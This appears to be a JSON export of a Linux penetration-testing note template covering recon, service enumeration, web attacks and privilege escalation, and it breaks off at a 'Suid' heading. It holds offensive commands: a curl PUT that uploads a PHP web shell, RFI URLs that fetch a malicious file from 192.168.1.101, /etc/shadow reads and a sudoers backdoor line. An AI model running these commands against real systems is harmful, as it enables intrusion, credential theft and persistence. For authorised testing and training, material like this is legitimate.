{"targets":[],"libraries":[],"templates":[{"id":"3e89e852-bba1-4a4a-ab56-1b3f7a8f58ed","title":"Linux","content":"<p><strong style=\"font-family: martel-sans; color: rgb(240, 102, 102); font-size: 36px;\">Linux</strong><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 36px;\"> Template</strong></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 24px;\">Info Sheet</strong></p><ol><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">DNS-Domain name:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Host name:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">OS:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Server:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Kernel:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Workgroup:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Domain:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">IP: </span></li></ol><p><br></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Services and ports: </span></p><pre class=\"ql-syntax\" spellcheck=\"false\">INSERTTCPSCAN\n</pre><p><br></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 24px;\">Recon</span></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Always start with a stealthy scan to avoid closing ports.</span></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Syn-scan</span>\nnmap -sS INSERTIPADDRESS\n\n<span class=\"hljs-comment\"># Scan all ports, might take a while.</span>\nnmap INSERTIPADDRESS -p-\n\n<span class=\"hljs-comment\"># Service-version, default scripts, OS:</span>\nnmap INSERTIPADDRESS -sV -sC -O -p <span class=\"hljs-number\">111</span>,<span class=\"hljs-number\">222</span>,<span class=\"hljs-number\">333</span>\n\n<span class=\"hljs-comment\"># Scan for UDP</span>\nnmap INSERTIPADDRESS -sU\nunicornscan -mU -v -I INSERTIPADDRESS\n\n<span class=\"hljs-comment\"># Connect to udp if one is open</span>\nnc -u INSERTIPADDRESS <span class=\"hljs-number\">48772</span>\n\n<span class=\"hljs-comment\"># Monster scan</span>\nnmap INSERTIPADDRESS -p- -A -T4 -sC\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Port 21 - FTP</strong></p><ul><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">FTP-Name:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">FTP-version:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Anonymous login:</span></li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">INSERTFTPTEST\n</pre><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Port 22 - SSH</strong></p><ul><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Name:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Version:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Takes-password:</span></li></ul><p><br></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">If you have usernames test login with username:username</span></p><pre class=\"ql-syntax\" spellcheck=\"false\">INSERTSSHCONNECT\n</pre><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">nc INSERTIPADDRESS 22\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Port 25</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">Name:\nVersion:\nVRFY:\n</pre><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">INSERTSMTPCONNECT\n</pre><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">nc -nvv INSERTIPADDRESS 25\nHELO foo&lt;cr&gt;&lt;lf&gt;\n\ntelnet INSERTIPADDRESS 25\nVRFY root\n\nnmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 INSERTIPADDRESS\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Port 69 - UDP - TFTP</strong></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">This is used for tftp-server.</span></p><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Port 110 - Pop3</strong></p><ul><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Name:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Version:</span></li></ul><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">INSERTPOP3CONNECT\n</pre><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">telnet INSERTIPADDRESS <span class=\"hljs-number\">110</span>\nUSER pelle@INSERTIPADDRESS\nPASS admin\n\n<span class=\"hljs-symbol\">or:</span>\n\nUSER pelle\nPASS admin\n\n<span class=\"hljs-comment\"># List all emails</span>\nlist\n\n<span class=\"hljs-comment\"># Retrieve email number 5, for example</span>\nretr <span class=\"hljs-number\">9</span>\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Port 111 - Rpcbind</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">rpcinfo -p INSERTIPADDRESS\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Port 135 - MSRPC</strong></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Some versions are vulnerable.</span></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Port 143 - Imap</strong></p><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Port 139/445 - SMB</strong></p><ul><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Name:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Version:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Domain/workgroup name:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Domain-sid:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Allows unauthenticated login:</span></li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-<span class=\"hljs-number\">3103</span>.nse,smb-vuln-ms06-<span class=\"hljs-number\">025</span>.nse,smb-vuln-ms07-<span class=\"hljs-number\">02</span>9.nse,smb-vuln-ms08-<span class=\"hljs-number\">067</span>.nse,smb-vuln-ms1<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">054</span>.nse,smb-vuln-ms1<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">061</span>.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse INSERTIPADDRESS -p <span class=\"hljs-number\">445</span>\n\n\nenum4linux -a INSERTIPADDRESS\nrpcclient -U <span class=\"hljs-string\">\"\"</span> INSERTIPADDRESS\n\tsrvinfo\n\tenumdomusers\n\tgetdompwinfo\n\tquerydominfo\n\tnetshareenum\n\tnetshareenumall\n\nsmbclient -L INSERTIPADDRESS\nsmbclient /<span class=\"hljs-regexp\">/INSERTIPADDRESS/tmp</span>\nsmbclient \\\\\\\\INSERTIPADDRESS\\\\ipc$ -U john\nsmbclient /<span class=\"hljs-regexp\">/INSERTIPADDRESS/ipc</span>$ -U john&nbsp;&nbsp;\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Port 161/162 UDP - SNMP</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS\nsnmp-check -t INSERTIPADDRESS -c public\n</pre><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Common community strings</span>\npublic\nprivate\ncommunity\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Port 554 - RTSP</strong></p><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Port 1030/1032/1033/1038</strong></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Used by RPC to connect in domain network.</span></p><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Port 1521 - Oracle</strong></p><ul><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Name:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Version:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Password protected:</span></li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">tnscmd10g version -h INSERTIPADDRESS\ntnscmd10g status -h INSERTIPADDRESS\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Port 2049 - NFS</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">showmount -e INSERTIPADDRESS\n</pre><p><br></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">If you find anything you can mount it like this:</span></p><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">mount INSERTIPADDRESS:<span class=\"hljs-regexp\">/ /</span>tmp/NFS\nmount -t INSERTIPADDRESS:<span class=\"hljs-regexp\">/ /</span>tmp/NFS\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Port 2100 - Oracle XML DB</strong></p><ul><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Name:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Version:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Default logins:</span></li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">sys:sys\nscott:tiger\n</pre><p><br></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Default passwords https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm</span></p><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">3306 - MySQL</strong></p><ul><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Name:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Version:</span></li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse INSERTIPADDRESS -p 3306\n\nmysql --host=INSERTIPADDRESS -u root -p\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Port 3339 - Oracle web interface</strong></p><ul><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Basic info about web service (apache, nginx, IIS)</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Server:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Scripting language:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Apache Modules:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">IP-address:</span></li></ul><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Port 80 - Web server</strong></p><ul><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Server:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Scripting language:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Apache Modules:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">IP-address:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Domain-name address:</span></li></ul><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">INSERTCURLHEADER\n</pre><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">Web application (ex, wordpress, joomla, phpmyadmin)\nName:\nVersion:\nAdmin-login:\n</pre><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Nikto</span>\nnikto -h http://INSERTIPADDRESS\n\n<span class=\"hljs-comment\"># Nikto with squid proxy</span>\nnikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:<span class=\"hljs-number\">4444</span>\n\n<span class=\"hljs-comment\"># Get header</span>\ncurl -i INSERTIPADDRESS\n\n<span class=\"hljs-comment\"># Get everything</span>\ncurl -i -L INSERTIPADDRESS\n\n<span class=\"hljs-comment\"># Check for title and all links</span>\ncurl INSERTIPADDRESS -s -L | grep <span class=\"hljs-string\">\"title\\|href\"</span> | sed -e <span class=\"hljs-string\">'s/^[[:space:]]*//'</span>\n\n<span class=\"hljs-comment\"># Look at page with just text</span>\ncurl INSERTIPADDRESS -s -L | html2text -width <span class=\"hljs-string\">'99'</span> | uniq\n\n<span class=\"hljs-comment\"># Check if it is possible to upload</span>\ncurl -v -X OPTIONS http://INSERTIPADDRESS/\ncurl -v -X PUT -d <span class=\"hljs-string\">'&lt;?php system($_GET[\"cmd\"]); ?&gt;'</span> http://INSERTIPADDRESS/test/shell.php\n\ndotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Nikto scan</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">INSERTNIKTOSCAN\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Url brute force</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Not recursive</span>\ndirb http://INSERTIPADDRESS -r -o dirb-INSERTIPADDRESS.txt\n\n<span class=\"hljs-comment\"># Gobuster - remove relevant responde codes (403 for example)</span>\ngobuster -u http://INSERTIPADDRESS -w /usr/share/seclists/Discovery/Web_Content/common.txt -s <span class=\"hljs-string\">'200,204,301,302,307,403,500'</span> -e\n\n\nINSERTDIRBSCAN\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Default/Weak login</strong></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Search documentation for default passwords and test them</span></p><pre class=\"ql-syntax\" spellcheck=\"false\">site:webapplication.com password\n</pre><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">admin admin\nadmin password\nadmin &lt;blank&gt;\nadmin &lt;servicename&gt;\nroot root\nroot admin\nroot password\nroot &lt;servicename&gt;\n&lt;username if you have&gt; password\n&lt;username if you have&gt; admin\n&lt;username if you have&gt; username\nusername &lt;servicename&gt;\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">LFI/RFI</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">fimap -u <span class=\"hljs-string\">\"http://INSERTIPADDRESS/example.php?test=\"</span>\n\n<span class=\"hljs-comment\"># Ordered output</span>\ncurl -s <span class=\"hljs-symbol\">http:</span>/<span class=\"hljs-regexp\">/INSERTIPADDRESS/gallery</span>.php?page=<span class=\"hljs-regexp\">/etc/passwd</span>\n/root/Tools/Kadimus/kadimus -u <span class=\"hljs-symbol\">http:</span>/<span class=\"hljs-regexp\">/INSERTIPADDRESS/example</span>.php?page=\n\n<span class=\"hljs-comment\"># Bypass execution</span>\n<span class=\"hljs-symbol\">http:</span>/<span class=\"hljs-regexp\">/INSERTIPADDRESS/index</span>.php?page=<span class=\"hljs-symbol\">php:</span>/<span class=\"hljs-regexp\">/filter/convert</span>.base64-encode/resource=index\nbase64 -d savefile.php\n\n<span class=\"hljs-comment\"># Bypass extension</span>\n<span class=\"hljs-symbol\">http:</span>/<span class=\"hljs-regexp\">/INSERTIPADDRESS/page</span>=<span class=\"hljs-symbol\">http:</span>/<span class=\"hljs-regexp\">/192.168.1.101/maliciousfile</span>.txt%<span class=\"hljs-number\">00</span>\n<span class=\"hljs-symbol\">http:</span>/<span class=\"hljs-regexp\">/INSERTIPADDRESS/page</span>=<span class=\"hljs-symbol\">http:</span>/<span class=\"hljs-regexp\">/192.168.1.101/maliciousfile</span>.txt?\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">SQL-Injection</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Post</span>\n./sqlmap.py -r search-test.txt -p tfUPass\n\n<span class=\"hljs-comment\"># Get</span>\nsqlmap -u <span class=\"hljs-string\">\"http://INSERTIPADDRESS/index.php?id=1\"</span> --dbms=mysql\n\n<span class=\"hljs-comment\"># Crawl</span>\nsqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=<span class=\"hljs-number\">3</span>\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Sql-login-bypass</strong></p><ul><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Open Burp-suite</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Make and intercept a request</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Send to intruder</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Cluster attack.</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Attack</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Check for response length variation</span></li></ul><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Password brute force - last resort</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">cewl\n</pre><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Port 443 - HTTPS</strong></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Heartbleed:</span></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Heartbleed</span>\nsslscan <span class=\"hljs-symbol\">INSERTIPADDRESS:</span><span class=\"hljs-number\">443</span>\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 24px;\">Vulnerability analysis</strong></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Now we have gathered information about the system. Now comes the part where we look for exploits and vulnerabilites and features.</span></p><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">To try - List of possibilies</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">Add possible exploits here:\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Find sploits - Searchsploit and google</strong></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Where there are many exploits for a software, use google. It will automatically sort it by popularity.</span></p><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">site:exploit-db.com apache <span class=\"hljs-number\">2.4.7</span>\n\n<span class=\"hljs-comment\"># Remove dos-exploits</span>\n\nsearchsploit Apache <span class=\"hljs-number\">2.4.7</span> | grep -v <span class=\"hljs-string\">'/dos/'</span>\nsearchsploit Apache | grep -v <span class=\"hljs-string\">'/dos/'</span> | grep -vi <span class=\"hljs-string\">\"tomcat\"</span>\n\n<span class=\"hljs-comment\"># Only search the title (exclude the path), add the -t</span>\nsearchsploit -t Apache | grep -v <span class=\"hljs-string\">'/dos/'</span>\n</pre><p><br></p><p><br></p><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-string\">'''''''''''''''''''''''''''''''''' PRIVESC '''''''''''''''''''''''''''''''''</span>\n\n</pre><p><br></p><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 24px;\">Privilege escalation</strong></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Now we start the whole enumeration-process over gain.</span></p><p><br></p><p><span style=\"font-size: 16px; font-family: martel-sans; color: rgb(68, 68, 68);\">Most likely</span></p><ul><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Kernel exploits</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Programs running as root</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Installed software</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Weak/reused/plaintext passwords</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Inside service</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Suid misconfiguration</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">World writable scripts invoked by root</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Unmounted filesystems</span></li></ul><p><br></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Less likely</span></p><ul><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Private ssh keys</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Bad path configuration</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Cronjobs</span></li></ul><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">To-try list</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\">#Here you will add all possible leads. What to try.</span>\n\n</pre><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Useful commands</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Spawning shell</span>\npython -c <span class=\"hljs-string\">'import pty; pty.spawn(\"/bin/sh\")'</span>\n\n<span class=\"hljs-comment\"># Access to more binaries</span>\nexport PATH=<span class=\"hljs-regexp\">/usr/local/sbin:/usr/local/bin</span><span class=\"hljs-symbol\">:/usr/sbin:/usr/bin:/sbin:/bin</span>\n\n<span class=\"hljs-comment\"># Set up webserver</span>\ncd /root/oscp/useful-tools/privesc/linux/privesc-scripts; python -m SimpleHTTPServer <span class=\"hljs-number\">8080</span>\n\n<span class=\"hljs-comment\"># Download all files</span>\nwget <span class=\"hljs-symbol\">http:</span>/<span class=\"hljs-regexp\">/192.168.1.101:8080/</span> -r; mv <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">1.101</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">8080</span> exploits; cd exploits; rm index.html; chmod <span class=\"hljs-number\">700</span> LinEnum.sh linprivchecker.py unix-privesc-check\n\n./LinEnum.sh -t -k password -r LinEnum.txt\npython linprivchecker.py extended\n./unix-privesc-check standard\n\n\n<span class=\"hljs-comment\"># Writable directories</span>\n/tmp\n/var/tmp\n\n\n<span class=\"hljs-comment\"># Add user to sudoers</span>\necho <span class=\"hljs-string\">\"hacker ALL=(ALL:ALL) ALL\"</span> &gt;&gt; <span class=\"hljs-regexp\">/etc/sudoers</span>\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Basic info</strong></p><ul><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">OS:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Version:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Kernel version:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Architecture:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Current user:</span></li></ul><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Devtools:</strong></p><ul><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">GCC:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">NC:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">WGET:</span></li></ul><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Users with login:</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">uname -a\nenv\nid\ncat /proc/version\ncat /etc/issue\ncat /etc/passwd\ncat /etc/group\ncat /etc/shadow\ncat /etc/hosts\n\n<span class=\"hljs-comment\"># Users with login</span>\ngrep -vE <span class=\"hljs-string\">\"nologin\"</span> /etc/passwd\n\n<span class=\"hljs-comment\"># Priv Enumeration Scripts</span>\n\n\nupload /unix-privesc-check\nupload /root/Desktop/Backup/Tools/Linux_privesc_tools/linuxprivchecker.py ./\nupload /root/Desktop/Backup/Tools/Linux_privesc_tools/LinEnum.sh ./\n\npython linprivchecker.py extended\n./LinEnum.sh -t -k password\nunix-privesc-check\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Kernel exploits</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">site:exploit-db.com kernel version\n\nperl /root/oscp/useful-tools/privesc/linux/Linux_Exploit_Suggester/Linux_Exploit_Suggester.pl -k 2.6\n\npython linprivchecker.py extended\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Programs running as root</strong></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Look for webserver, mysql or anything else like that.</span></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Metasploit</span>\nps\n\n<span class=\"hljs-comment\"># Linux</span>\nps aux\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Installed software</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">/usr/local/\n/usr/local/src\n/usr/local/bin\n/opt/\n/home\n/var/\n/usr/src/\n\n<span class=\"hljs-comment\"># Debian</span>\ndpkg -l\n\n<span class=\"hljs-comment\"># CentOS, OpenSuse, Fedora, RHEL</span>\nrpm -qa (CentOS / openSUSE )\n\n<span class=\"hljs-comment\"># OpenBSD, FreeBSD</span>\npkg_info\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Weak/reused/plaintext passwords</strong></p><ul><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Check database config-file</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Check databases</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Check weak passwords</span></li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">username:username\nusername:username1\nusername:root\nusername:admin\nusername:qwerty\nusername:password\n</pre><p><br></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Check plaintext</span></p><pre class=\"ql-syntax\" spellcheck=\"false\">./LinEnum.sh -t -k password\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Inside service</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Linux</span>\nnetstat -anlp\nnetstat -ano\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Suid 